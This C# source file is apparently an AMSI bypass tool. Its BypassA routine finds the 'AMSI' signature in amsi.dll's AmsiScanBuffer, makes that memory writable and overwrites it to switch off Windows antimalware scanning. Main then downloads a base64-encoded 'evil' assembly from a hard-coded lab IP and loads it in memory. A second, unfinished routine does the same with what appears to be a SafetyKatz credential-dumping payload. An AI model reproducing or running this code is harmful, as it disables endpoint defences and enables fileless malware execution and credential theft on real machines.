using Microsoft.Win32;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
//using EasyNetLibrary;

namespace AMSITest
{
    class Program
    {

        static void Main(string[] args)
        {

            // AMSI is available since v4.8
            // AMSIInitialize initializes a g_amsiContext struct.
            // Once it is initialized, it is stored in .data.
            // That struct is necessary for AmsiScanBuffer to work.
            // You could disable AmsiScanBuffer, but patching g_amsiContext after it is initialized.
            // Or, you could disable it by patching the immediate value in AmsiScanBuffer that it uses to check if amsi is enabled.
                // It looks for the text "AMSI" in the Signature member of the g_amsiContext struct.
                // If it is not there, then it assumes AMSI is disabled.
                       

            // check if .NET v4.8 is installed
            // https://docs.microsoft.com/en-us/dotnet/framework/migration-guide/how-to-determine-which-versions-are-installed

            const string subkey = @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\";

            const string entry = "Release";

            var ndpKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey(subkey);

            if (ndpKey != null && ndpKey.GetValue(entry) != null)
            {
                int version = (int)ndpKey.GetValue(entry);

                if (version >= 528040)
                {
                    Console.WriteLine("Reg key: HKLM\\{0}", subkey);
                    Console.WriteLine("Entry: {0}", entry);
                    Console.WriteLine("Value: {0}", version);

                    Console.WriteLine("Version is greater than 528040. .NET v4.8 or newer is installed.");

                    if (BypassA() == true)
                    {
                        //Load your malicious Assembly however you want

                        string url1 = @"http://192.168.197.136:8000/b64evil.txt";

                        string evil1 = new System.Net.WebClient().DownloadString(url1);

                        Assembly assembly11 = Assembly.Load(System.Convert.FromBase64String(evil1));

                        Console.WriteLine(assembly11.FullName);

                        //assembly.GetType("SafetyKatz.Program").GetMethod("Entry").Invoke(null, null);

                    }
                }
            }

            Console.Read();
        }

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hReservedNull, LoadLibraryFlags dwFlags);

        [System.Flags]
        enum LoadLibraryFlags : uint
        {
            None = 0,
            DONT_RESOLVE_DLL_REFERENCES = 0x00000001,
            LOAD_IGNORE_CODE_AUTHZ_LEVEL = 0x00000010,
            LOAD_LIBRARY_AS_DATAFILE = 0x00000002,
            LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE = 0x00000040,
            LOAD_LIBRARY_AS_IMAGE_RESOURCE = 0x00000020,
            LOAD_LIBRARY_SEARCH_APPLICATION_DIR = 0x00000200,
            LOAD_LIBRARY_SEARCH_DEFAULT_DIRS = 0x00001000,
            LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR = 0x00000100,
            LOAD_LIBRARY_SEARCH_SYSTEM32 = 0x00000800,
            LOAD_LIBRARY_SEARCH_USER_DIRS = 0x00000400,
            LOAD_WITH_ALTERED_SEARCH_PATH = 0x00000008
        }


        //Borrowed from Vanara: https://github.com/dahall/Vanara/blob/master/PInvoke/Kernel32/MemoryApi.cs
        public enum MEM_PROTECTION : uint
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400,
            PAGE_ENCLAVE_UNVALIDATED = 0x20000000,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
            PAGE_ENCLAVE_THREAD_CONTROL = 0x80000000,
            PAGE_REVERT_TO_FILE_MAP = 0x80000000,
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool VirtualProtect([In] IntPtr lpAddress, UIntPtr dwSize, MEM_PROTECTION flNewProtect, [Out] out MEM_PROTECTION lpflOldProtect);


        /// <summary>
        /// Works well.
        /// </summary>
        /// <returns></returns>
        static bool BypassA()
        {
            bool AMSI = false;


            // preemptively load AMSI.dll
            IntPtr hmodule = LoadLibraryEx("amsi.dll", IntPtr.Zero, LoadLibraryFlags.LOAD_LIBRARY_SEARCH_SYSTEM32);

            Console.WriteLine("DEBUG hmodule (amsi.dll address): {0}", hmodule);

            if (hmodule == null)
                return AMSI;

            // get a pointer to AMSIScanBuffer
            IntPtr hscan = GetProcAddress(hmodule, "AmsiScanBuffer");

            Console.WriteLine("DEBUG hscan (AmsiScanBuffer address): {0}", hscan);

            Console.WriteLine("SCANNING MEMORY FOR \"AMSI\"");

            for (int i = 0; i != -1; i++)
            {
                // Current localtion we are looking at
                IntPtr hoffset = IntPtr.Add(hscan, i);

                // Get the next 4 ANSI characters as a string
                string value = Marshal.PtrToStringAnsi(hoffset, 4);
                
                //Console.WriteLine("DEBUG, {0}, {1}: {2}", i, hoffset, value);

                if (value == "AMSI")
                {
                    Console.WriteLine("FOUND IT!!!!!!!");

                    Console.WriteLine("Corrupting signature...");

                    // Generating a random 4-byte value to replace AMSI with
                    Random rand = new Random();
                    Int32 result = rand.Next();

                    // Change permissions so that we can edit
                    MEM_PROTECTION original;
                    VirtualProtect(hoffset, new UIntPtr(4096), MEM_PROTECTION.PAGE_EXECUTE_READWRITE, out original);
                    Console.WriteLine("DEBUG, original memory protection: {0}", original);

                    // Replace "ASMI" with the new value.
                    Marshal.WriteInt32(hoffset, 0, result);

                    //Restore to original permissions
                    MEM_PROTECTION after;
                    VirtualProtect(hoffset, new UIntPtr(4096), original, out after);
                    Console.WriteLine("DEBUG, restored to original memory protection from: {0}", after);

                    Console.WriteLine("New Value: {0}", result);

                    Console.WriteLine("DEBUG, {0}, {1}: {2}", i, hoffset, Marshal.PtrToStringAnsi(hoffset, 4));

                    // Exit our scan
                    i = -1;

                    // We're done, exit
                    return true;
                }
            }

            return AMSI;

        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);


        /// <summary>
        /// Not currently working. Almost, though.
        /// </summary>
        /// <returns></returns>
        static bool BypassB()
        {
            bool AMSI = true;

            Console.WriteLine("[+] Calling Load_3 with empty buffer...");

            try
            {
                byte[] notEvil = { };

                Assembly assembly = Assembly.Load(notEvil);

                Console.WriteLine(assembly.FullName);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Successfully caught COR_E_BADIMAGEFORMAT Exception.");

                Console.WriteLine(ex.Message);

                Console.WriteLine("[+] g_amsiContext is initialized in clr.dll.");
            }

            IntPtr handle = GetModuleHandle("amsi.dll");

            if (handle != null)
            {
                // we found it initialized by previous call to Load_3()
                Console.WriteLine("[+] Detected AMSI in our process...");

                // try to disable it

                AMSI = DisableAMSI();

                Console.WriteLine("[!] DisableAMSI {0}!", AMSI ? "SUCCEEDED" : "FAILED");
            }

            // amsi was disabled, so it is safe to proceed.
            if (AMSI)
            {
                string url = @"http://192.168.197.136:8000/b64katz.txt";

                string evil = new System.Net.WebClient().DownloadString(url);

                Assembly assembly = Assembly.Load(evil);

                //assembly.GetType("SafetyKatz.Program").GetMethod("Entry").Invoke(null, null);
            }

            return AMSI;
        }

         static bool DisableAMSI()
        {
            bool disabled = false; // sentinal value for returning result
            IMAGE_DOS_HEADER dos; // struct containing the layout of the PE headers sequentially in memory
            IMAGE_NT_HEADERS nt;
            IMAGE_SECTION_HEADER sh;

            Console.WriteLine("[!] Obtaining base address of CLR.");
            IntPtr hCLR = GetModuleHandle("clr.dll");
            

            if (hCLR != null)
            {
                Console.WriteLine("[+] Locating .data section...");
                //dos = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(hCLR); // case the handle to a structure so that we may refer to the PE header elements
                
                //nt = Marshal.PtrToStructure<IMAGE_NT_HEADERS>(hCLR + dos.e_lfanew);

                //IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(nt.OptionalHeader));

                //sh = Marshal.PtrToStructure<IMAGE_NT_HEADERS>(Marshal.STr nt.OptionalHeader + nt.FileHeader.SizeOfOptionalHeader); //figure this out when you're awake
            }

            return disabled;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DATA_DIRECTORY
    {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER32
    {
        //
        // Standard fields.
        //

        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt32 BaseOfData;

        //
        // NT additional fields.
        //

        public UInt32 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt32 SizeOfStackReserve;
        public UInt32 SizeOfStackCommit;
        public UInt32 SizeOfHeapReserve;
        public UInt32 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] //IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

  [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER64
    {
        //
        // Standard fields.
        //

        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt64 ImageBase;

        //
        // NT additional fields.
        //

        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt64 SizeOfStackReserve;
        public UInt64 SizeOfStackCommit;
        public UInt64 SizeOfHeapReserve;
        public UInt64 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)] //IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DOS_HEADER // DOS .EXE header
    {
        public UInt16 e_magic;                     // Magic number
        public UInt16 e_cblp;                      // Bytes on last page of file
        public UInt16 e_cp;                        // Pages in file
        public UInt16 e_crlc;                      // Relocations
        public UInt16 e_cparhdr;                   // Size of header in paragraphs
        public UInt16 e_minalloc;                  // Minimum extra paragraphs needed
        public UInt16 e_maxalloc;                  // Maximum extra paragraphs needed
        public UInt16 e_ss;                        // Initial (relative) SS value
        public UInt16 e_sp;                        // Initial SP value
        public UInt16 e_csum;                      // Checksum
        public UInt16 e_ip;                        // Initial IP value
        public UInt16 e_cs;                        // Initial (relative) CS value
        public UInt16 e_lfarlc;                    // File address of relocation table
        public UInt16 e_ovno;                      // Overlay number
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public UInt16[] e_res;                    // Reserved words
        public UInt16 e_oemid;                     // OEM identifier (for e_oeminfo)
        public UInt16 e_oeminfo;                   // OEM information; e_oemid specific
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public UInt16[] e_res2;                  // Reserved words
        public Int32 e_lfanew;                    // File address of new exe header
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS64
    {
        public UInt16 Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS
    {
        public UInt16 Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]// IMAGE_SIZEOF_SHORT_NAME              8
        Byte[] Name;

        [StructLayout(LayoutKind.Explicit)]
        struct Misc{
            [FieldOffset(0)]
            public UInt32 PhysicalAddress;
            [FieldOffset(1)]
            public UInt32 VirtualSize;
        }

        UInt32 VirtualAddress;
        UInt32 SizeOfRawData;
        UInt32 PointerToRawData;
        UInt32 PointerToRelocations;
        UInt32 PointerToLinenumbers;
        UInt16 NumberOfRelocations;
        UInt16 NumberOfLinenumbers;
        UInt32 Characteristics;
    }
}
